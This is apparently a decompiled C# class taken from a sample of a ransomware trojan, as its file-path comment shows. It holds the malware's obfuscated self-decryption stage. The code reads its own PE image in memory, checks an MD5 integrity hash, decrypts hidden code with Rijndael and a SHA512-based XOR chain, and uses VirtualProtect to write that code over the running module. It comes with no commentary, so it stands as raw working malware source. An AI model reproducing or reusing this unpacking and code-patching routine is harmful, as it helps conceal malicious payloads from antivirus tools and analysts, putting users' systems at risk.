// Decompiled with JetBrains decompiler
// Type: 덽ꆔ䪞乚후悝蒸
// Assembly: eL1Vzv, Version=3.7.4.6, Culture=neutral, PublicKeyToken=null
// MVID: 4948659B-E9CC-421E-BCA7-732AA5B9488E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Blocker.ljzh-09d9bf2538f3a54947f4ae9a5e397cf846d3340a.exe

using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

internal static class 덽ꆔ䪞乚\uE5A7후悝蒸
{
  [DllImport("kernel32.dll", EntryPoint = "VirtualProtect", PreserveSig = false)]
  private static extern bool 많掞怪顱뜏鬴榧鳴(
    IntPtr _param0,
    uint _param1,
    uint _param2,
    out uint _param3);

  public static unsafe void 㹁\uE702\uF5A4\u1739坸䞐㴙Ͳ()
  {
    Module module = typeof (덽ꆔ䪞乚\uE5A7후悝蒸).Module;
    IntPtr hinstance = Marshal.GetHINSTANCE(module);
    if (hinstance == (IntPtr) -1)
      Environment.FailFast("Module error");
    bool flag = module.FullyQualifiedName != "<Unknown>";
    Stream input = (Stream) new UnmanagedMemoryStream((byte*) hinstance.ToPointer(), 268435455L, 268435455L, FileAccess.ReadWrite);
    byte[] array;
    ulong num1;
    byte[] numArray1;
    byte[] numArray2;
    using (BinaryReader binaryReader = new BinaryReader(input))
    {
      input.Seek(60L, SeekOrigin.Begin);
      uint offset1 = binaryReader.ReadUInt32();
      input.Seek((long) offset1, SeekOrigin.Begin);
      input.Seek(6L, SeekOrigin.Current);
      uint num2 = (uint) binaryReader.ReadUInt16();
      input.Seek(12L, SeekOrigin.Current);
      uint num3 = (uint) binaryReader.ReadUInt16();
      Stream stream = input;
      int num4 = (int) offset1;
      uint num5;
      long offset2 = (long) (num5 = (uint) (num4 + 24));
      stream.Seek(offset2, SeekOrigin.Begin);
      int num6 = (int) binaryReader.ReadUInt16();
      input.Seek(62L, SeekOrigin.Current);
      long position = input.Position;
      uint offset3 = binaryReader.ReadUInt32() ^ 412966056U;
      if (offset3 == 412966056U)
        goto label_12;
label_10:
      uint num7;
      input.Seek((long) (num7 = num5 + num3), SeekOrigin.Begin);
      uint offset4 = 0;
      for (int index1 = 0; (long) index1 < (long) num2; index1++)
      {
        string str = "";
        for (int index2 = 0; index2 < 8; ++index2)
        {
          byte num8 = binaryReader.ReadByte();
          if (num8 == (byte) 0)
            continue;
          str += (string) (object) (char) num8;
        }
        uint num9 = binaryReader.ReadUInt32();
        uint num10 = binaryReader.ReadUInt32();
        int num11 = (int) binaryReader.ReadUInt32();
        uint num12 = binaryReader.ReadUInt32();
        if (str.GetHashCode() == 64253146)
          goto label_14;
label_9:
        if (!flag && offset3 > num10 && offset3 < num10 + num9)
          goto label_8;
label_4:
        input.Seek(16L, SeekOrigin.Current);
        continue;
label_8:
        offset3 = offset3 - num10 + num12;
        goto label_4;
label_14:
        offset4 = flag ? num10 : num12;
        goto label_9;
      }
      input.Seek((long) offset3, SeekOrigin.Begin);
      using (MemoryStream memoryStream = new MemoryStream())
      {
        input.Position += 12L;
        input.Position += (long) (binaryReader.ReadUInt32() + 4U);
        input.Position += 2L;
        ushort num13 = binaryReader.ReadUInt16();
        for (int index = 0; index < (int) num13; ++index)
        {
          uint num14 = binaryReader.ReadUInt32() + offset3;
          uint count = binaryReader.ReadUInt32();
          int num15 = 0;
          while (binaryReader.ReadByte() != (byte) 0)
            ++num15;
          long num16 = input.Position += (long) ((num15 + 1 + 3 & -4) - (num15 + 1));
          input.Position = (long) num14;
          memoryStream.Write(binaryReader.ReadBytes((int) count), 0, (int) count);
          input.Position = num16;
        }
        array = memoryStream.ToArray();
      }
      input.Seek((long) offset4, SeekOrigin.Begin);
      num1 = binaryReader.ReadUInt64() ^ 6477089245931038923UL;
      binaryReader.ReadInt32();
      binaryReader.ReadInt32();
      numArray1 = binaryReader.ReadBytes(binaryReader.ReadInt32() ^ -1699532391);
      numArray2 = binaryReader.ReadBytes(binaryReader.ReadInt32() ^ 335912756);
      goto label_32;
label_12:
      Environment.FailFast("Broken file");
      goto label_10;
    }
label_32:
    byte[] hash = MD5.Create().ComputeHash(array);
    if ((long) (BitConverter.ToUInt64(hash, 0) ^ BitConverter.ToUInt64(hash, 8)) != (long) num1)
      Environment.FailFast("Broken file");
    byte[] src = 덽ꆔ䪞乚\uE5A7후悝蒸.噳ﳊ䓶튺\uFFF1㭢\uED47䜃(array, numArray1, numArray2);
    Buffer.BlockCopy((Array) new byte[array.Length], 0, (Array) array, 0, array.Length);
    if (src[0] != (byte) 214 || src[1] != (byte) 111)
      Environment.FailFast("Broken file");
    byte[] numArray3 = new byte[src.Length - 2];
    Buffer.BlockCopy((Array) src, 2, (Array) numArray3, 0, numArray3.Length);
    using (BinaryReader binaryReader = new BinaryReader((Stream) new MemoryStream(numArray3)))
    {
      uint length = binaryReader.ReadUInt32();
      int[] numArray4 = new int[(IntPtr) length];
      IntPtr[] numArray5 = new IntPtr[(IntPtr) length];
      for (int index = 0; (long) index < (long) length; index++)
      {
        uint num17 = binaryReader.ReadUInt32() ^ 1124451958U;
        if (num17 == 0U)
          continue;
        uint num18 = binaryReader.ReadUInt32() ^ 1124451958U;
        byte[] source = binaryReader.ReadBytes(binaryReader.ReadInt32());
        IntPtr destination = (IntPtr) (long) (uint) ((int) hinstance + (flag ? (int) num18 : (int) num17));
        uint num19;
        덽ꆔ䪞乚\uE5A7후悝蒸.많掞怪顱뜏鬴榧鳴(destination, (uint) source.Length, 4U, out num19);
        Marshal.Copy(source, 0, destination, source.Length);
        덽ꆔ䪞乚\uE5A7후悝蒸.많掞怪顱뜏鬴榧鳴(destination, (uint) source.Length, num19, out num19);
        numArray4[index] = source.Length;
        numArray5[index] = destination;
      }
    }
  }

  private static byte[] 噳ﳊ䓶튺\uFFF1㭢\uED47䜃(byte[] _param0, byte[] _param1, byte[] _param2)
  {
    Rijndael rijndael = Rijndael.Create();
    byte[] buffer = new byte[_param2.Length];
    using (CryptoStream cryptoStream = new CryptoStream((Stream) new MemoryStream(_param2), rijndael.CreateDecryptor(SHA256.Create().ComputeHash(_param0), _param1), CryptoStreamMode.Read))
      cryptoStream.Read(buffer, 0, _param2.Length);
    SHA512 shA512 = SHA512.Create();
    byte[] hash = shA512.ComputeHash(_param0);
    for (int offset = 0; offset < buffer.Length; offset += 64)
    {
      int num = buffer.Length <= offset + 64 ? buffer.Length : offset + 64;
      for (int index = offset; index < num; index++)
        buffer[index] ^= (byte) ((int) hash[index - offset] ^ (int) byte.MaxValue);
      hash = shA512.ComputeHash(buffer, offset, num - offset);
    }
    return buffer;
  }
}
